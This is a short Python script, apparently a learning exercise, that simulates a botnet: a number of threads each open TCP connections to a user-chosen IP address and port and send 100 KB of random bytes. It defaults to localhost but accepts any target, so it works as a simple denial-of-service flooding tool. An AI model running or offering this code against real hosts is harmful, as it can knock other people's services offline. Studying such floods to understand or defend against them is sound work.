import threading
import socket 
import random 
import time 


class ZombieNetwork:
    """micmiking zombie attack"""

    def __init__(self, num_zombies=10, target_ip="127.0.0.1", target_port=80):
        self.num_zombies = num_zombies
        self.target_ip = target_ip
        self.target_port = target_port
        self.zombies = []  # keep track of the running zombies
        self.running = False

    def create_zombie(self, zombie_id):
        """simluate an infected zoombie"""
        while self.running:
            try:
                # simulate attack

                sock = socket.socket()
                # sock.settimeout(300)
                sock.connect((self.target_ip, self.target_port))

                # send random junks
                junk = bytes(random.getrandbits(8) for _ in range(1024*100))
                sock.send(junk)

                print(f"Zombie ({zombie_id}) attacking")
                time.sleep(random.uniform(0.1, 0.5))
            except (socket.error, socket.timeout) as e:
                print(f"Zombie ({zombie_id}) attack failed: {e}")
            time.sleep(random.uniform(0.5, 1.5))
            # finally:
            #     socket.close()

    def start_attack(self):
        """startt attack func"""
        self.running = True
        for z in range(self.num_zombies):
            zombie = threading.Thread(target=self.create_zombie, args=(z,))
            zombie.daemon = True
            self.zombies.append(zombie)
            zombie.start()
            print(f"zombie attack {z} runing")
        print("Zombie attack started")
    
    def stop_attack(self):
        """stop the zombie attack"""
        self.running = False
        for zombie in self.zombies:
            zombie.join()
        print("Zombie attack stopped")


if __name__ == "__main__":
    print("ZOMBIE ATTACK SIMULATOR")

    target = input("enter the ip address (127.0.0.1)") or "127.0.0.1"
    port = int(input("enter the port to attack")) or 80
    zombies = int(input("number of zombie attack to simulate (1-100)")) or 5

    botnet = ZombieNetwork(zombies, target, port)
    try:
        botnet.start_attack()
        input("press enter to stop the attack")
    finally:
        botnet.stop_attack()